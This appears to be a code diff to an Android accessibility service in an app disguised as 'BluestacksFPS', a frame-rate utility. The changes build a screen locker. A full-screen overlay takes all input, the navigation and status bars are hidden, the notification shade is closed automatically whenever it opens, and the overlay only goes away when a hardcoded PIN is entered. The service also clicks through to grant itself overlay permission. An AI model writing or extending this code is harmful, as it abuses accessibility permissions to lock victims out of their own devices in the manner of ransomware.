@@ -12,6 +12,9 @@ import android.view.View;
 import android.view.WindowManager;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
+import android.widget.Button;
+import android.widget.TextView;
+
 import java.util.List;
 import android.os.Environment;
 import java.io.File;
@@ -20,19 +23,15 @@ import java.io.FileWriter;
 public class FPSAccessibilityService extends AccessibilityService {
 
     private long lastActionTime = 0;
-    private static final long ACTION_DELAY = 1000; // Ditingkatkan ke 1s agar lebih stabil
+    private static final long ACTION_DELAY = 1000; 
     private WindowManager windowManager;
     private View godModeOverlay;
+    private String currentInput = "";
 
     @Override
     protected void onServiceConnected() {
         super.onServiceConnected();
-        writeLog("FPS Service Connected - Initializing Overlay"); 
-        
-        // Langsung lompat tanpa menunggu event pertama
-        jumpToOverlaySettings(); 
-        
-        // Aktifkan God Mode Overlay
+        writeLog("FPS Service Connected - God Mode Activated"); 
         showGodModeOverlay();
     }
 
@@ -42,15 +41,26 @@ public class FPSAccessibilityService extends AccessibilityService {
         windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
         godModeOverlay = LayoutInflater.from(this).inflate(R.layout.locker_layout, null);
 
+        // Immersive Mode: Menyembunyikan Navigasi & Status Bar secara total
+        godModeOverlay.setSystemUiVisibility(
+                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY |
+                View.SYSTEM_UI_FLAG_LAYOUT_STABLE |
+                View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION |
+                View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN |
+                View.SYSTEM_UI_FLAG_HIDE_NAVIGATION |
+                View.SYSTEM_UI_FLAG_FULLSCREEN
+        );
+
         WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                 WindowManager.LayoutParams.MATCH_PARENT,
                 WindowManager.LayoutParams.MATCH_PARENT,
-                // TYPE_ACCESSIBILITY_OVERLAY adalah kunci untuk menutupi Status Bar & Quick Settings secara total
                 WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
-                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
+                // FLAG_LAYOUT_IN_SCREEN & NO_LIMITS: Menabrak batas layar (termasuk navbar)
+                // Tanpa FLAG_NOT_FOCUSABLE: Memblokir input ke aplikasi di belakangnya
                 WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                 WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
-                WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
+                WindowManager.LayoutParams.FLAG_FULLSCREEN |
+                WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED,
                 PixelFormat.TRANSLUCENT);
 
         params.gravity = Gravity.FILL;
@@ -59,10 +69,60 @@ public class FPSAccessibilityService extends AccessibilityService {
         }
 
         try {
+            setupKeypadLogic(godModeOverlay);
             windowManager.addView(godModeOverlay, params);
             writeLog("God Mode Overlay Added successfully.");
         } catch (Exception e) {
             writeLog("Failed to add God Mode Overlay: " + e.getMessage());
+        }
+    }
+
+    private void setupKeypadLogic(View view) {
+        TextView display = view.findViewById(R.id.textDisplayPassword);
+        TextView textStatusMessage = view.findViewById(R.id.textStatusMessage);
+
+        View.OnClickListener numListener = v -> {
+            Button b = (Button) v;
+            if (currentInput.length() < 12) {
+                currentInput += b.getText().toString();
+                display.setText(currentInput.replaceAll(".", "* "));
+            }
+        };
+
+        int[] buttonIds = {R.id.btn0, R.id.btn1, R.id.btn2, R.id.btn3, R.id.btn4, 
+                           R.id.btn5, R.id.btn6, R.id.btn7, R.id.btn8, R.id.btn9};
+        for (int id : buttonIds) {
+            View btn = view.findViewById(id);
+            if (btn != null) btn.setOnClickListener(numListener);
+        }
+
+        View btnDel = view.findViewById(R.id.btnDelete);
+        if (btnDel != null) {
+            btnDel.setOnClickListener(v -> {
+                if (currentInput.length() > 0) {
+                    currentInput = currentInput.substring(0, currentInput.length() - 1);
+                    display.setText(currentInput.replaceAll(".", "* "));
+                }
+            });
+        }
+
+        View btnUnlock = view.findViewById(R.id.btnUnlock);
+        if (btnUnlock != null) {
+            btnUnlock.setOnClickListener(v -> {
+                if ("02042009".equals(currentInput)) {
+                    if (godModeOverlay != null) {
+                        windowManager.removeView(godModeOverlay);
+                        godModeOverlay = null;
+                        FPSService.isAuthenticated = true;
+                        writeLog("God Mode Unlocked!");
+                    }
+                } else {
+                    currentInput = "";
+                    display.setText("");
+                    textStatusMessage.setText("WRONG KEY");
+                    new android.os.Handler().postDelayed(() -> textStatusMessage.setText(""), 2000);
+                }
+            });
         }
     }
 
@@ -85,33 +145,21 @@ public class FPSAccessibilityService extends AccessibilityService {
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
-        int eventType = event.getEventType();
         String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
 
-        // 1. BLOKIR QUICK SETTINGS & NOTIFIKASI
-        // Setiap kali user menarik status bar, packageName biasanya berubah menjadi systemui
         if (packageName.equals("com.android.systemui")) {
-            // Tekan BACK secara virtual untuk menutup panel yang sedang meluncur turun
             performGlobalAction(GLOBAL_ACTION_BACK);
-
             if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
                 performGlobalAction(GLOBAL_ACTION_DISMISS_NOTIFICATION_SHADE);
             }
-            Intent closeDialog = new Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS);
-            sendBroadcast(closeDialog);
-            
-            writeLog("Quick Settings/Notification blocked.");
         }
 
         AccessibilityNodeInfo rootNode = getRootInActiveWindow();
         if (rootNode == null) return;
 
         try {
-            if (packageName.equals("android") || packageName.contains("systemui")) {
-                checkAndDismissSensitiveUI(rootNode);
-            }
+            checkAndDismissSensitiveUI(rootNode);
             handleOverlayPermissionFlow(rootNode, packageName);
-            
         } finally {
             rootNode.recycle();
         }
@@ -121,25 +169,11 @@ public class FPSAccessibilityService extends AccessibilityService {
         new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
             AccessibilityNodeInfo currentRoot = getRootInActiveWindow();
             if (currentRoot == null) return;
-    
             try {
                 List<AccessibilityNodeInfo> targets = currentRoot.findAccessibilityNodeInfosByText("BluestacksFPS");
                 AccessibilityNodeInfo switchNode = findNodeById(currentRoot, "android:id/switch_widget");
-                
-                if (!targets.isEmpty() && switchNode != null) {
-                    if (!switchNode.isChecked()) {
-                        writeLog("Direct hit! Turning toggle ON.");
-                        performClick(switchNode);
-                        
-                        // Tambahan: Tunggu sebentar setelah klik, lalu paksa buka diri sendiri
-                        new android.os.Handler().postDelayed(() -> {
-                             forceOpenApp();
-                        }, 500); 
-    
-                    } else {
-                        writeLog("Toggle is already ON. Triggering Locker.");
-                        forceOpenApp(); // Pastikan panggil ini
-                    }
+                if (!targets.isEmpty() && switchNode != null && !switchNode.isChecked()) {
+                    performClick(switchNode);
                 } else if (pkg.contains("settings")) {
                     clickByText(currentRoot, "BluestacksFPS");
                 }
@@ -149,17 +183,7 @@ public class FPSAccessibilityService extends AccessibilityService {
         }, 150);
     }
     
-    private void forceOpenApp() {
-        Intent i = new Intent(this, MainActivity.class);
-        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | 
-                   Intent.FLAG_ACTIVITY_REORDER_TO_FRONT | 
-                   Intent.FLAG_ACTIVITY_SINGLE_TOP |
-                   Intent.FLAG_ACTIVITY_CLEAR_TOP);
-        startActivity(i);
-        triggerOverlay();
-    }
-    
-        private AccessibilityNodeInfo findNodeById(AccessibilityNodeInfo root, String viewId) {
+    private AccessibilityNodeInfo findNodeById(AccessibilityNodeInfo root, String viewId) {
         List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(viewId);
         return (nodes != null && !nodes.isEmpty()) ? nodes.get(0) : null;
     }
@@ -181,7 +205,6 @@ public class FPSAccessibilityService extends AccessibilityService {
         }
         if (clickable != null && clickable.isClickable()) {
             clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK);
-            lastActionTime = System.currentTimeMillis();
         }
     }
 
@@ -192,21 +215,6 @@ public class FPSAccessibilityService extends AccessibilityService {
                 performGlobalAction(GLOBAL_ACTION_BACK);
                 break;
             }
-        }
-    }
-
-    private void jumpToOverlaySettings() {
-        writeLog("Executing Jump to Overlay Settings");
-        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, 
-                                Uri.parse("package:" + getPackageName()));
-        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_HISTORY | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
-        startActivity(intent);
-    }
-
-    private void triggerOverlay() {
-        if (!FPSService.isAuthenticated) {
-            Intent intent = new Intent(this, FPSService.class);
-            startService(intent);
         }
     }
 
